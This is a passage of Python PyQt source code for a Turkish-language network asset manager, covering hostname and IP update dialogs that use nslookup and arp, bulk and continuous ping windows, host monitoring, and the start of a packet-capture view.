        e2y      = sum(1 for v in scanned if v["sk"] == "eski_yeni")
        migrated = sum(1 for v in scanned if v["sk"] == "migrated")
        other    = sum(1 for v in scanned if v["sk"] in ("eski_eski","yeni_eski","yeni_yeni","ambiguous"))
        notfound = sum(1 for v in scanned if v["sk"] == "bulunamadi")
        self.card_guncel._val.setText(str(guncel))
        self.card_e2y._val.setText(str(e2y + migrated))   # Migration da göster
        self.card_other._val.setText(str(other))
        self.card_notfound._val.setText(str(notfound))
        # Bulunan benzersiz etki alanlarını güncelle
        domains = {v["domain"] for v in scanned if v.get("domain")}
        if hasattr(self, "card_domains"):
            self.card_domains._val.setText(str(len(domains)))
            tip = "\n".join(sorted(domains)) if domains else "—"
            self.card_domains.setToolTip(f"Etki alanları:\n{tip}")

    # ══════════════════════════════════════════════════════════════════ #
    #  Filtre
    # ══════════════════════════════════════════════════════════════════ #
    def _apply_filter(self):
        fi     = self.filter_cb.currentIndex()
        fn     = self.FILTERS[fi][1]
        search = self.search_box.text().strip().lower()

        for row in range(self.table.rowCount()):
            chk = self.table.item(row, self.C_CHK)
            if not chk:
                continue
            aid  = chk.data(Qt.ItemDataRole.UserRole)
            info = self.results.get(aid, {})

            # Durum filtresi
            if not fn(info):
                self.table.setRowHidden(row, True)
                continue

            # Metin arama
            if search:
                texts = [
                    self.table.item(row, self.C_NAME) and self.table.item(row, self.C_NAME).text() or "",
                    self.table.item(row, self.C_IP)   and self.table.item(row, self.C_IP).text()   or "",
                    self.table.item(row, self.C_OLD)  and self.table.item(row, self.C_OLD).text()  or "",
                    self.table.item(row, self.C_NEW)  and self.table.item(row, self.C_NEW).text()  or "",
                ]
                if not any(search in t.lower() for t in texts):
                    self.table.setRowHidden(row, True)
                    continue

            self.table.setRowHidden(row, False)

    # ══════════════════════════════════════════════════════════════════ #
    #  Seçim yardımcıları
    # ══════════════════════════════════════════════════════════════════ #
    def _toggle_all(self, state):
        cs = Qt.CheckState.Checked if state == Qt.CheckState.Checked.value else Qt.CheckState.Unchecked
        for row in range(self.table.rowCount()):
            if not self.table.isRowHidden(row):
                it = self.table.item(row, self.C_CHK)
                if it:
                    it.setCheckState(cs)

    def _quick_select(self, predicate):
        """predicate(info) → bool olan satırları seç, diğerlerini kaldır."""
        for row in range(self.table.rowCount()):
            it = self.table.item(row, self.C_CHK)
            if not it:
                continue
            aid  = it.data(Qt.ItemDataRole.UserRole)
            info = self.results.get(aid, {})
            it.setCheckState(
                Qt.CheckState.Checked if predicate(info)
                else Qt.CheckState.Unchecked
            )

    # ══════════════════════════════════════════════════════════════════ #
    #  Güncelleme
    # ══════════════════════════════════════════════════════════════════ #
    def _apply_updates(self):
        to_update = []
        for row in range(self.table.rowCount()):
            it = self.table.item(row, self.C_CHK)
            if it and it.checkState() == Qt.CheckState.Checked:
                aid  = it.data(Qt.ItemDataRole.UserRole)
                info = self.results.get(aid, {})
                if info.get("new"):
                    to_update.append((aid, info["new"], info.get("new_fmt", "")))

        if not to_update:
            QMessageBox.information(self, "Bilgi", "Güncellenecek satır seçilmedi.")
            return

        reply = QMessageBox.question(
            self, "Onay",
            f"{len(to_update)} varlığın hostname bilgisi güncellenecek.\nDevam edilsin mi?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply != QMessageBox.StandardButton.Yes:
            return

        updated = 0
        for aid, new_hn, new_fmt in to_update:
            if self.org.assets.get(aid):
                info = self.results.get(aid, {})
                verified_domain = info.get("verified_domain", "")
                domain_source   = info.get("domain_source", "")
                conf            = info.get("confidence", "")

                # Güncelleme yükü: hostname her zaman, domain SADECE verified varsa
                update_payload = {"hostname": new_hn}
                if (verified_domain and
                        "conflict" not in domain_source and
                        conf in ("HIGH", "MEDIUM")):
                    update_payload["domain"]            = verified_domain
                    update_payload["domain_source"]     = domain_source
                    update_payload["domain_confidence"] = conf
                # predicted_domain asla kalıcı yazılmaz

                self.org.update_asset(aid, **update_payload)
                info["old"]     = new_hn
                info["old_fmt"] = new_fmt
                info["sk"]      = "guncel"
                updated += 1

        # Tabloyu yansıt
        _, fg_ok, bg_ok = self.STATUS_DEF["guncel"]
        for row in range(self.table.rowCount()):
            it = self.table.item(row, self.C_CHK)
            if not it:
                continue
            aid  = it.data(Qt.ItemDataRole.UserRole)
            info = self.results.get(aid, {})
            if info.get("sk") == "guncel":
                # Eski hostname sütununu güncelle
                old_it = self.table.item(row, self.C_OLD)
                if old_it:
                    old_it.setText(info["old"])
                self.table.setItem(row, self.C_OFMT, self._fmt_item(info["old_fmt"]))
                stat_it = self.table.item(row, self.C_STAT)
                if stat_it:
                    stat_it.setText("✅  Güncellendi")
                    stat_it.setForeground(QColor(fg_ok))
                for col in range(self.table.columnCount()):
                    ci = self.table.item(row, col)
                    if ci:
                        ci.setBackground(QColor(bg_ok))

        QMessageBox.information(
            self, "✅  Tamamlandı",
            f"{updated} varlığın hostname'i başarıyla güncellendi."
        )

    def closeEvent(self, event):
        """Dialog kapanırken tarama thread'ini güvenli durdur."""
        thread = getattr(self, 'thread', None)
        if thread is not None and thread.isRunning():
            thread.stop()
            thread.wait(2000)   # max 2 saniye bekle
        super().closeEvent(event)


class PingResultDialog(QDialog):
    """Toplu Ping Sonuçları Dialogu"""
    def __init__(self,parent,targets):
        super().__init__(parent)
        self.targets=targets
        self.setWindowTitle(f"📡 Ping Sonuçları ({len(targets)} cihaz)")
        self.setMinimumSize(600,400)
        self.setStyleSheet("""
            QDialog{background:#0a0a14;}
            QLabel{color:white;}
            QTableWidget{background:#16213e;border:1px solid #0f3460;font-size:11px;color:white;}
            QHeaderView::section{background:#0f3460;color:#00ff88;padding:6px;font-weight:bold;}
            QPushButton{background:#00ff88;color:#0a0a14;padding:10px 20px;border:none;border-radius:6px;font-weight:bold;}
            QPushButton:hover{background:#00cc6a;}
        """)
        self.setup_ui()
        self.start_ping()
    
    def setup_ui(self):
        layout=QVBoxLayout(self)
        self.status_label=QLabel("⏳ Ping atılıyor...")
        self.status_label.setStyleSheet("color:#00d4ff;font-size:14px;font-weight:bold;padding:10px;")
        layout.addWidget(self.status_label)
        self.progress=QProgressBar()
        self.progress.setStyleSheet("QProgressBar{background:#16213e;border:1px solid #0f3460;border-radius:6px;height:20px;text-align:center;color:white;}QProgressBar::chunk{background:#00ff88;border-radius:5px;}")
        self.progress.setMaximum(len(self.targets))
        layout.addWidget(self.progress)
        self.result_table=QTableWidget()
        self.result_table.setColumnCount(4)
        self.result_table.setHorizontalHeaderLabels(["Durum","Ad","IP/Hostname","Ping (ms)"])
        self.result_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.result_table.horizontalHeader().resizeSection(0,60)
        self.result_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        layout.addWidget(self.result_table)
        self.summary_label=QLabel("")
        self.summary_label.setStyleSheet("color:#888;font-size:12px;padding:5px;")
        layout.addWidget(self.summary_label)
        close_btn=QPushButton("Kapat")
        close_btn.clicked.connect(self.close)
        layout.addWidget(close_btn)
    
    def start_ping(self):
        self.thread=PingThread(self.targets)
        self.thread.result.connect(self.on_result)
        self.thread.finished_signal.connect(self.on_finished)
        self.thread.start()
    
    def on_result(self,name,target,success,ping_time):
        row=self.result_table.rowCount()
        self.result_table.insertRow(row)
        status_item=QTableWidgetItem("✅" if success else "❌")
        status_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        status_item.setForeground(QColor("#00ff88" if success else "#ff6b6b"))
        self.result_table.setItem(row,0,status_item)
        self.result_table.setItem(row,1,QTableWidgetItem(name))
        self.result_table.setItem(row,2,QTableWidgetItem(target))
        ping_item=QTableWidgetItem(f"{ping_time:.0f}" if success else "-")
        ping_item.setForeground(QColor("#00ff88" if success else "#888"))
        self.result_table.setItem(row,3,ping_item)
        self.progress.setValue(row+1)
    
    def on_finished(self):
        total=self.result_table.rowCount()
        online=sum(1 for r in range(total) if self.result_table.item(r,0).text()=="✅")
        self.status_label.setText(f"✅ Tamamlandı!")
        self.summary_label.setText(f"📊 Toplam: {total} | 🟢 Online: {online} | 🔴 Offline: {total-online}")


class PingThread(QThread):
    result=pyqtSignal(str,str,bool,float)
    finished_signal=pyqtSignal()
    def __init__(self,targets):
        super().__init__()
        self.targets=targets
    def run(self):
        for name,target in self.targets:
            success,ping_time=False,0
            try:
                if platform.system()=="Windows":
                    cmd=["ping","-n","1","-w","1000",target]
                else:
                    cmd=["ping","-c","1","-W","1",target]
                result=run_command(cmd,timeout=3)
                success=result.returncode==0
                if success:
                    # Türkçe ve İngilizce Windows desteği
                    match=re.search(r'(?:time|süre|zaman)\s*[=<]\s*(\d+\.?\d*)\s*m?s?',result.stdout,re.IGNORECASE)
                    if match:
                        ping_time=float(match.group(1))
                        if ping_time==0:ping_time=1
                    else:
                        match2=re.search(r'[=<]\s*(\d+\.?\d*)\s*ms',result.stdout,re.IGNORECASE)
                        if match2:
                            ping_time=float(match2.group(1))
                            if ping_time==0:ping_time=1
            except:pass
            self.result.emit(name,target,success,ping_time)
        self.finished_signal.emit()


class ContinuousPingThread(QThread):
    """Sürekli ping thread'i (ping -t gibi)"""
    ping_result = pyqtSignal(int, bool, float, str)  # seq, success, ping_ms, raw_output
    
    def __init__(self, target):
        super().__init__()
        self.target = target
        self._running = True
        self.seq = 0
    
    def stop(self):
        self._running = False
    
    def run(self):
        while self._running:
            self.seq += 1
            success, ping_ms, raw = False, 0, ""
            try:
                if platform.system() == "Windows":
                    cmd = ["ping", "-n", "1", "-w", "1000", self.target]
                else:
                    cmd = ["ping", "-c", "1", "-W", "1", self.target]
                
                result = run_command(cmd, timeout=3)
                success = result.returncode == 0
                raw = result.stdout.strip()
                
                # Ping süresini parse et - Türkçe ve İngilizce Windows desteği
                # Formatlar: time=1ms, time<1ms, süre=1ms, süre<1ms, time=0.5ms
                if success:
                    # Önce time veya süre ara
                    match = re.search(r'(?:time|süre|zaman)\s*[=<]\s*(\d+\.?\d*)\s*m?s?', result.stdout, re.IGNORECASE)
                    if match:
                        ping_ms = float(match.group(1))
                        # time<1ms durumunda 0 gelebilir, 1 olarak göster
                        if ping_ms == 0:
                            ping_ms = 1
                    else:
                        # Alternatif format: "1ms" veya "1 ms" şeklinde
                        match2 = re.search(r'[=<]\s*(\d+\.?\d*)\s*ms', result.stdout, re.IGNORECASE)
                        if match2:
                            ping_ms = float(match2.group(1))
                            if ping_ms == 0:
                                ping_ms = 1
            except Exception as e:
                raw = str(e)
            
            self.ping_result.emit(self.seq, success, ping_ms, raw)
            
            # 1 saniye bekle (ama durdurulabilir şekilde)
            for _ in range(10):
                if not self._running:
                    break
                time.sleep(0.1)


class ContinuousPingDialog(QDialog):
    """Sürekli Ping Dialogu (ping -t gibi)"""
    def __init__(self, parent, name, ip):
        super().__init__(parent)
        self.name = name
        self.ip = ip
        self.thread = None
        self.stats = {'sent': 0, 'received': 0, 'lost': 0, 'min': 9999, 'max': 0, 'total': 0}
        
        self.setWindowTitle(f"🔄 Sürekli Ping - {name} ({ip})")
        self.setWindowIcon(create_app_icon())
        self.setMinimumSize(650, 500)
        self.setStyleSheet("""
            QDialog{background:#0a0a14;}
            QLabel{color:white;}
            QTextEdit{background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;font-family:Consolas,monospace;font-size:11px;}
            QPushButton{padding:10px 20px;border:none;border-radius:6px;font-weight:bold;}
        """)
        self.setup_ui()
        self.start_ping()
    
    def setup_ui(self):
        layout = QVBoxLayout(self)
        
        # Başlık
        header = QLabel(f"📡 Ping {self.ip} ({self.name})")
        header.setStyleSheet("color:#00ff88;font-size:16px;font-weight:bold;padding:10px;")
        layout.addWidget(header)
        
        # İstatistik satırı
        stats_layout = QHBoxLayout()
        
        self.sent_label = QLabel("📤 Gönderilen: 0")
        self.sent_label.setStyleSheet("color:#00d4ff;font-size:12px;padding:5px;")
        stats_layout.addWidget(self.sent_label)
        
        self.recv_label = QLabel("📥 Alınan: 0")
        self.recv_label.setStyleSheet("color:#00ff88;font-size:12px;padding:5px;")
        stats_layout.addWidget(self.recv_label)
        
        self.lost_label = QLabel("❌ Kayıp: 0 (0%)")
        self.lost_label.setStyleSheet("color:#ff6b6b;font-size:12px;padding:5px;")
        stats_layout.addWidget(self.lost_label)
        
        stats_layout.addStretch()
        
        self.ping_stats_label = QLabel("⏱️ Min/Avg/Max: -/-/- ms")
        self.ping_stats_label.setStyleSheet("color:#f39c12;font-size:12px;padding:5px;")
        stats_layout.addWidget(self.ping_stats_label)
        
        layout.addLayout(stats_layout)
        
        # Ping çıktısı
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setMinimumHeight(300)
        layout.addWidget(self.output_text)
        
        # Durum satırı
        self.status_label = QLabel("🔄 Ping devam ediyor... (Durdurmak için butona basın)")
        self.status_label.setStyleSheet("color:#00d4ff;font-size:11px;padding:5px;")
        layout.addWidget(self.status_label)
        
        # Butonlar
        btn_layout = QHBoxLayout()
        
        self.stop_btn = QPushButton("⏹️ Durdur")
        self.stop_btn.setStyleSheet("background:#e74c3c;color:white;")
        self.stop_btn.clicked.connect(self.stop_ping)
        btn_layout.addWidget(self.stop_btn)
        
        self.clear_btn = QPushButton("🗑️ Temizle")
        self.clear_btn.setStyleSheet("background:#0f3460;color:white;")
        self.clear_btn.clicked.connect(self.clear_output)
        btn_layout.addWidget(self.clear_btn)
        
        btn_layout.addStretch()
        
        self.copy_btn = QPushButton("📋 Kopyala")
        self.copy_btn.setStyleSheet("background:#0f3460;color:white;")
        self.copy_btn.clicked.connect(self.copy_output)
        btn_layout.addWidget(self.copy_btn)
        
        self.close_btn = QPushButton("Kapat")
        self.close_btn.setStyleSheet("background:#6c757d;color:white;")
        self.close_btn.clicked.connect(self.close)
        btn_layout.addWidget(self.close_btn)
        
        layout.addLayout(btn_layout)
    
    def start_ping(self):
        self.output_text.append(f"<span style='color:#00ff88'>Pinging {self.ip} with 32 bytes of data:</span>\n")
        self.thread = ContinuousPingThread(self.ip)
        self.thread.ping_result.connect(self.on_ping_result)
        self.thread.start()
    
    def on_ping_result(self, seq, success, ping_ms, raw):
        self.stats['sent'] += 1
        
        if success:
            self.stats['received'] += 1
            self.stats['total'] += ping_ms
            self.stats['min'] = min(self.stats['min'], ping_ms)
            self.stats['max'] = max(self.stats['max'], ping_ms)
            
            # Renk kodlama
            if ping_ms < 50:
                color = "#00ff88"  # Yeşil
            elif ping_ms < 100:
                color = "#f39c12"  # Turuncu
            else:
                color = "#e74c3c"  # Kırmızı
            
            line = f"<span style='color:{color}'>Reply from {self.ip}: bytes=32 time={ping_ms:.0f}ms TTL=64</span>"
        else:
            self.stats['lost'] += 1
            line = f"<span style='color:#ff6b6b'>Request timed out.</span>"
        
        self.output_text.append(line)
        
        # Otomatik scroll
        scrollbar = self.output_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
        
        # İstatistikleri güncelle
        self.update_stats()
    
    def update_stats(self):
        sent = self.stats['sent']
        recv = self.stats['received']
        lost = self.stats['lost']
        loss_pct = (lost / sent * 100) if sent > 0 else 0
        
        self.sent_label.setText(f"📤 Gönderilen: {sent}")
        self.recv_label.setText(f"📥 Alınan: {recv}")
        self.lost_label.setText(f"❌ Kayıp: {lost} ({loss_pct:.0f}%)")
        
        if recv > 0:
            avg = self.stats['total'] / recv
            min_ms = self.stats['min']
            max_ms = self.stats['max']
            self.ping_stats_label.setText(f"⏱️ Min/Avg/Max: {min_ms:.0f}/{avg:.0f}/{max_ms:.0f} ms")
    
    def stop_ping(self):
        if self.thread and self.thread.isRunning():
            self.thread.stop()
            self.thread.wait()
        
        self.status_label.setText("⏹️ Ping durduruldu.")
        self.status_label.setStyleSheet("color:#f39c12;font-size:11px;padding:5px;")
        self.stop_btn.setEnabled(False)
        self.stop_btn.setText("⏹️ Durduruldu")
        
        # Özet ekle
        sent = self.stats['sent']
        recv = self.stats['received']
        lost = self.stats['lost']
        loss_pct = (lost / sent * 100) if sent > 0 else 0
        
        self.output_text.append(f"\n<span style='color:#00d4ff'>Ping statistics for {self.ip}:</span>")
        self.output_text.append(f"<span style='color:white'>    Packets: Sent = {sent}, Received = {recv}, Lost = {lost} ({loss_pct:.0f}% loss)</span>")
        
        if recv > 0:
            avg = self.stats['total'] / recv
            self.output_text.append(f"<span style='color:white'>Approximate round trip times in milli-seconds:</span>")
            self.output_text.append(f"<span style='color:white'>    Minimum = {self.stats['min']:.0f}ms, Maximum = {self.stats['max']:.0f}ms, Average = {avg:.0f}ms</span>")
    
    def clear_output(self):
        self.output_text.clear()
        self.output_text.append(f"<span style='color:#00ff88'>Pinging {self.ip} with 32 bytes of data:</span>\n")
    
    def copy_output(self):
        QApplication.clipboard().setText(self.output_text.toPlainText())
        self.status_label.setText("📋 Çıktı panoya kopyalandı!")
    
    def closeEvent(self, event):
        if self.thread and self.thread.isRunning():
            self.thread.stop()
            self.thread.wait()
        event.accept()


class IPUpdateThread(QThread):
    """IP güncelleme tarama thread'i"""
    progress = pyqtSignal(int, str)  # index, status
    result = pyqtSignal(str, str, str, str, str)  # asset_id, name, old_ip, new_ip, method
    finished_signal = pyqtSignal()
    
    def __init__(self, assets):
        super().__init__()
        self.assets = assets
        self._stop = False
    
    def stop(self):
        self._stop = True
    
    @staticmethod
    def _same_subnet(ip1: str, ip2: str) -> bool:
        """İki IP aynı /16 subnet'te mi? DC gibi yanlış IP'leri filtreler.
        Örnek: 10.248.x.x ile 10.240.x.x → False (farklı subnet)
        """
        if not ip1 or not ip2:
            return True   # Eski IP yoksa kısıtlama yapma
        try:
            p1 = ip1.strip().split('.')
            p2 = ip2.strip().split('.')
            if len(p1) != 4 or len(p2) != 4:
                return False
            return p1[0] == p2[0] and p1[1] == p2[1]   # /16: ilk 2 oktet
        except Exception:
            return False
    
    def run(self):
        for i, asset in enumerate(self.assets):
            if self._stop:
                break
            
            self.progress.emit(i, f"🔍 {asset.name}...")
            
            old_ip = asset.ip_address or ""
            new_ip = None
            method = ""
            
            # Hostname üzerinden IP bul
            if asset.hostname:
                try:
                    if platform.system() == "Windows":
                        result = run_command(["nslookup", asset.hostname], timeout=3)
                        if result.returncode == 0:
                            lns = result.stdout.split('\n')
                            for j, line in enumerate(lns):
                                if 'Address' in line and j > 1:
                                    parts = line.split(':')
                                    if len(parts) > 1:
                                        candidate = parts[1].strip()
                                        if (re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', candidate)
                                                and self._same_subnet(candidate, old_ip)):
                                            new_ip = candidate
                                            method = "Hostname"
                                            break
                    else:
                        result = run_command(["getent", "hosts", asset.hostname], timeout=3)
                        if result.returncode == 0 and result.stdout.strip():
                            candidate = result.stdout.split()[0]
                            if self._same_subnet(candidate, old_ip):
                                new_ip = candidate
                                method = "Hostname"
                except:
                    pass
            
            # MAC adresi üzerinden ARP tablosundan IP bul
            if not new_ip and asset.mac_address:
                try:
                    mac_upper = asset.mac_address.upper().replace('-', ':')
                    if platform.system() == "Windows":
                        result = run_command(["arp", "-a"], timeout=3)
                    else:
                        result = run_command(["arp", "-n"], timeout=3)
                    
                    if result.returncode == 0:
                        for line in result.stdout.split('\n'):
                            line_upper = line.upper().replace('-', ':')
                            if mac_upper in line_upper:
                                match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
                                if match:
                                    new_ip = match.group(1)
                                    method = "MAC"
                                    break
                except:
                    pass
            
            # Sonucu bildir (değişiklik varsa)
            if new_ip and new_ip != old_ip:
                self.result.emit(asset.id, asset.name, old_ip, new_ip, method)
            elif not new_ip and old_ip:
                # IP bulunamadı ama eskiden vardı
                self.result.emit(asset.id, asset.name, old_ip, "", "Bulunamadı")
        
        self.progress.emit(len(self.assets), "✅ Tamamlandı")
        self.finished_signal.emit()


class IPUpdateDialog(QDialog):
    """IP Güncelleme Sonuçları Dialogu"""
    def __init__(self, parent, assets, org):
        super().__init__(parent)
        self.assets = assets
        self.org = org
        self.changes = []  # [(asset_id, name, old_ip, new_ip, method), ...]
        self.thread = None
        
        self.setWindowTitle(f"🔄 IP Güncelleme ({len(assets)} varlık)")
        self.setWindowIcon(create_app_icon())
        self.setMinimumSize(750, 500)
        self.setStyleSheet("""
            QDialog{background:#0a0a14;}
            QLabel{color:white;}
            QTableWidget{background:#16213e;border:1px solid #0f3460;font-size:11px;color:white;}
            QHeaderView::section{background:#0f3460;color:#00ff88;padding:6px;font-weight:bold;}
            QPushButton{padding:10px 20px;border:none;border-radius:6px;font-weight:bold;}
            QCheckBox{color:white;}
        """)
        self.setup_ui()
        self.start_scan()
    
    def setup_ui(self):
        layout = QVBoxLayout(self)
        
        # Durum
        self.status_label = QLabel("⏳ IP adresleri kontrol ediliyor...")
        self.status_label.setStyleSheet("color:#00d4ff;font-size:14px;font-weight:bold;padding:10px;")
        layout.addWidget(self.status_label)
        
        # Progress bar
        self.progress = QProgressBar()
        self.progress.setStyleSheet("""
            QProgressBar{background:#16213e;border:1px solid #0f3460;border-radius:6px;height:20px;text-align:center;color:white;}
            QProgressBar::chunk{background:#e67e22;border-radius:5px;}
        """)
        self.progress.setMaximum(len(self.assets))
        layout.addWidget(self.progress)
        
        # Değişiklik tablosu
        layout.addWidget(QLabel("📋 Tespit Edilen IP Değişiklikleri:"))
        
        self.result_table = QTableWidget()
        self.result_table.setColumnCount(6)
        self.result_table.setHorizontalHeaderLabels(["✓", "Varlık Adı", "Eski IP", "→", "Yeni IP", "Yöntem"])
        self.result_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        self.result_table.horizontalHeader().resizeSection(0, 30)
        self.result_table.horizontalHeader().resizeSection(1, 180)
        self.result_table.horizontalHeader().resizeSection(2, 130)
        self.result_table.horizontalHeader().resizeSection(3, 30)
        self.result_table.horizontalHeader().resizeSection(4, 130)
        self.result_table.horizontalHeader().resizeSection(5, 100)
        self.result_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.result_table.verticalHeader().setVisible(False)
        layout.addWidget(self.result_table)
        
        # Özet
        self.summary_label = QLabel("")
        self.summary_label.setStyleSheet("color:#888;font-size:12px;padding:5px;")
        layout.addWidget(self.summary_label)
        
        # Butonlar
        btn_layout = QHBoxLayout()
        
        self.select_all_btn = QPushButton("☑️ Tümünü Seç")
        self.select_all_btn.setStyleSheet("background:#0f3460;color:white;")
        self.select_all_btn.clicked.connect(self.select_all)
        btn_layout.addWidget(self.select_all_btn)
        
        self.deselect_all_btn = QPushButton("☐ Seçimi Kaldır")
        self.deselect_all_btn.setStyleSheet("background:#0f3460;color:white;")
        self.deselect_all_btn.clicked.connect(self.deselect_all)
        btn_layout.addWidget(self.deselect_all_btn)
        
        btn_layout.addStretch()
        
        self.update_btn = QPushButton("✅ Seçilenleri Güncelle")
        self.update_btn.setStyleSheet("background:#00ff88;color:#0a0a14;")
        self.update_btn.clicked.connect(self.apply_updates)
        self.update_btn.setEnabled(False)
        btn_layout.addWidget(self.update_btn)
        
        self.close_btn = QPushButton("Kapat")
        self.close_btn.setStyleSheet("background:#e74c3c;color:white;")
        self.close_btn.clicked.connect(self.close)
        btn_layout.addWidget(self.close_btn)
        
        layout.addLayout(btn_layout)
    
    def start_scan(self):
        self.thread = IPUpdateThread(self.assets)
        self.thread.progress.connect(self.on_progress)
        self.thread.result.connect(self.on_result)
        self.thread.finished_signal.connect(self.on_finished)
        self.thread.start()
    
    def on_progress(self, index, status):
        self.progress.setValue(index)
        self.status_label.setText(status)
    
    def on_result(self, asset_id, name, old_ip, new_ip, method):
        self.changes.append((asset_id, name, old_ip, new_ip, method))
        
        row = self.result_table.rowCount()
        self.result_table.insertRow(row)
        
        # Checkbox
        chk = QCheckBox()
        chk.setChecked(True if new_ip else False)  # Yeni IP varsa işaretle
        chk.setEnabled(bool(new_ip))  # Yeni IP yoksa disable
        chk_widget = QWidget()
        chk_layout = QHBoxLayout(chk_widget)
        chk_layout.addWidget(chk)
        chk_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        chk_layout.setContentsMargins(0, 0, 0, 0)
        self.result_table.setCellWidget(row, 0, chk_widget)
        
        # Varlık adı
        name_item = QTableWidgetItem(name)
        name_item.setForeground(QColor("#00d4ff"))
        self.result_table.setItem(row, 1, name_item)
        
        # Eski IP
        old_item = QTableWidgetItem(old_ip or "(boş)")
        old_item.setForeground(QColor("#ff6b6b"))
        self.result_table.setItem(row, 2, old_item)
        
        # Ok işareti
        arrow_item = QTableWidgetItem("→")
        arrow_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self.result_table.setItem(row, 3, arrow_item)
        
        # Yeni IP
        new_item = QTableWidgetItem(new_ip or "(bulunamadı)")
        new_item.setForeground(QColor("#00ff88" if new_ip else "#888"))
        self.result_table.setItem(row, 4, new_item)
        
        # Yöntem
        method_item = QTableWidgetItem(method)
        method_item.setForeground(QColor("#f39c12"))
        self.result_table.setItem(row, 5, method_item)
    
    def on_finished(self):
        found = sum(1 for c in self.changes if c[3])  # Yeni IP bulunanlar
        not_found = sum(1 for c in self.changes if not c[3])  # Bulunamayanlar
        
        self.status_label.setText(f"✅ Tarama tamamlandı!")
        self.summary_label.setText(
            f"📊 Toplam: {len(self.assets)} varlık tarandı | "
            f"🔄 {found} IP değişikliği bulundu | "
            f"❓ {not_found} IP bulunamadı"
        )
        
        if found > 0:
            self.update_btn.setEnabled(True)
    
    def select_all(self):
        for row in range(self.result_table.rowCount()):
            chk_widget = self.result_table.cellWidget(row, 0)
            if chk_widget:
                chk = chk_widget.findChild(QCheckBox)
                if chk and chk.isEnabled():
                    chk.setChecked(True)
    
    def deselect_all(self):
        for row in range(self.result_table.rowCount()):
            chk_widget = self.result_table.cellWidget(row, 0)
            if chk_widget:
                chk = chk_widget.findChild(QCheckBox)
                if chk:
                    chk.setChecked(False)
    
    def apply_updates(self):
        updated = 0
        update_list = []
        
        for row in range(self.result_table.rowCount()):
            chk_widget = self.result_table.cellWidget(row, 0)
            if chk_widget:
                chk = chk_widget.findChild(QCheckBox)
                if chk and chk.isChecked():
                    asset_id, name, old_ip, new_ip, method = self.changes[row]
                    if new_ip:
                        self.org.update_asset(asset_id, ip_address=new_ip)
                        update_list.append(f"• {name}: {old_ip or '(boş)'} → {new_ip}")
                        updated += 1
        
        if updated > 0:
            msg = f"✅ {updated} varlığın IP adresi güncellendi:\n\n"
            msg += "\n".join(update_list[:20])  # İlk 20'yi göster
            if len(update_list) > 20:
                msg += f"\n... ve {len(update_list) - 20} diğer varlık"
            
            QMessageBox.information(self, "Başarılı", msg)
            self.accept()
        else:
            QMessageBox.warning(self, "Uyarı", "Güncellenecek varlık seçilmedi!")
    
    def closeEvent(self, event):
        if self.thread and self.thread.isRunning():
            self.thread.stop()
            self.thread.wait()
        event.accept()



# Monitoring Thread
class MonitorThread(QThread):
    status_update=pyqtSignal(str,bool,float)  # ip, is_up, ping_ms
    alarm=pyqtSignal(str,str)  # ip, message
    def __init__(self,targets,interval=30):
        super().__init__();self.targets=targets;self.interval=interval;self.running=True
    def stop(self):self.running=False
    def run(self):
        while self.running:
            for t in self.targets:
                if not self.running:break
                if not t.get('enabled',True):continue
                ip=t['ip'];name=t.get('name',ip)
                is_up,ping_ms=ping_host(ip)
                now=datetime.now()
                if 'history' not in t:t['history']=deque(maxlen=2880)
                t['history'].append({'time':now.isoformat(),'up':is_up,'ping':ping_ms})
                prev_status=t.get('last_status',True)
                if is_up!=prev_status:
                    if not is_up and t.get('alarm_on_down',True):
                        self.alarm.emit(ip,f"🔴 {name} ({ip}) ÇEVRIMDIŞI!")
                    elif is_up:
                        self.alarm.emit(ip,f"🟢 {name} ({ip}) tekrar çevrimiçi")
                    t['last_status']=is_up
                self.status_update.emit(ip,is_up,ping_ms if is_up else -1)
            for _ in range(self.interval):
                if not self.running:break
                time.sleep(1)

# ============= WIRESHARK-STYLE PACKET CAPTURE =============

PROTOCOL_COLORS={
    'TCP':'#5294e2','UDP':'#73d216','ARP':'#f5c211','ICMP':'#ad7fa8',
    'DNS':'#fcaf3e','HTTP':'#ef2929','HTTPS':'#4e9a06','SSH':'#75507b',
    'FTP':'#c17d11','SMTP':'#cc0000','POP3':'#f57900','IMAP':'#edd400',
    'DHCP':'#729fcf','NTP':'#8ae234','SNMP':'#e9b96e','RDP':'#3465a4',
    'SMB':'#888a85','TELNET':'#a40000','MYSQL':'#4e9a06','MSSQL':'#ce5c00',
    'UNKNOWN':'#555555'
}

KNOWN_SERVICES={
    20:'FTP-DATA',21:'FTP',22:'SSH',23:'TELNET',25:'SMTP',53:'DNS',67:'DHCP',68:'DHCP',
    80:'HTTP',110:'POP3',119:'NNTP',123:'NTP',137:'NETBIOS',138:'NETBIOS',139:'NETBIOS',
    143:'IMAP',161:'SNMP',162:'SNMP',389:'LDAP',443:'HTTPS',445:'SMB',465:'SMTPS',
    514:'SYSLOG',587:'SMTP',636:'LDAPS',993:'IMAPS',995:'POP3S',1433:'MSSQL',1521:'ORACLE',
    3306:'MYSQL',3389:'RDP',5432:'POSTGRES',5900:'VNC',8080:'HTTP-ALT',8443:'HTTPS-ALT'
}

class PacketData:
    """Paket verisi container"""
    def __init__(self,no,timestamp,src_ip,src_port,dst_ip,dst_port,protocol,length,info,raw_data=None):
        self.no=no
        self.timestamp=timestamp
        self.src_ip=src_ip
        self.src_port=src_port
        self.dst_ip=dst_ip
        self.dst_port=dst_port
        self.protocol=protocol
        self.length=length
        self.info=info
        self.raw_data=raw_data or b''
    
    @property
    def source(self):
        return f"{self.src_ip}:{self.src_port}" if self.src_port else self.src_ip
    
    @property
    def destination(self):
        return f"{self.dst_ip}:{self.dst_port}" if self.dst_port else self.dst_ip

class NetworkCaptureThread(QThread):
